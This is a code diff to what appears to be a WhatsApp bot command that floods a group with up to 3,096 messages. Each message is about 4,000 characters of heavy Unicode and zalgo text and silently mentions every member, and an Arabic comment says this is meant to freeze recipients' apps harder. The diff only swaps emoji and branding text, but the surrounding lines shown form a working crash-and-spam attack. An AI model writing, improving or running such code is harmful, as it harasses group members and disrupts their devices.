@@ -1,6 +1,6 @@
 let handler = async (m, { conn, isOwner, participants }) => {
-    if (!isOwner) return m.reply('❌ ~ هذا الأمر للمطور فقط');
-    if (!m.isGroup) return m.reply('❌ ~ يعمل في الجروبات فقط');
+    if (!isOwner) return m.reply('🅇 ~ هذا الأمر للمطور فقط');
+    if (!m.isGroup) return m.reply('🅇 ~ يعمل في الجروبات فقط');
 
     const groupId = m.chat;
     const total = 3096;
@@ -14,7 +14,7 @@ let handler = async (m, { conn, isOwner, participants }) => {
 
     // ─── نص ثقيل جداً (~4000 حرف) ───
     // أحرف يونيكود ثقيلة + تكرار
-    const heavyBase = '𝐒𝐎𝐕𝐄𝐑𝐄𝐈𝐆𝐍 𝐗 𝐒𝐋𝐀𝐕𝐄𝐒';
+    const heavyBase = '𝑺𝒂𝒍𝒆𝒗𝒆𝒓';
     const zalgo = '̷̛̛̣̰̖̻͉͎̲̼̤̪̹̠̩̫̲̩̪̬̗̥̣̝͇̫͚̠̪̲̟̮̺̜̹̠̩̫̲̩̪̬̗̥̣̝͇̫͚̠̪̲̟̮̺̜';
     const heavyText = (heavyBase + zalgo + ' ').repeat(80).substring(0, 4000);
 
@@ -42,7 +42,7 @@ let handler = async (m, { conn, isOwner, participants }) => {
 
         try {
             await conn.sendMessage(groupId, {
-                text: `${heavyText}\n\n⚠️ [${i}/${total}] 𝐒𝐎𝐕𝐄𝐑𝐄𝐈𝐆𝐍 𝐗`,
+                text: `${heavyText}\n\n⚠️ [${i}/${total}] 𝑺𝒂𝒍𝒆𝒗𝒆𝒓`,
                 mentions: allMentions // ← منشن صامت للكل في كل رسالة = تهنيج أقوى
             });
             sent++;
@@ -56,7 +56,7 @@ let handler = async (m, { conn, isOwner, participants }) => {
 
         } catch (e) {
             console.error(`Error at ${i}:`, e.message);
-            await m.reply(`❌ ~ توقف عند ${i}\n💥 ~ السبب: ${e.message}`);
+            await m.reply(`🅇 ~ توقف عند ${i}\n💥 ~ السبب: ${e.message}`);
             break;
         }
     }
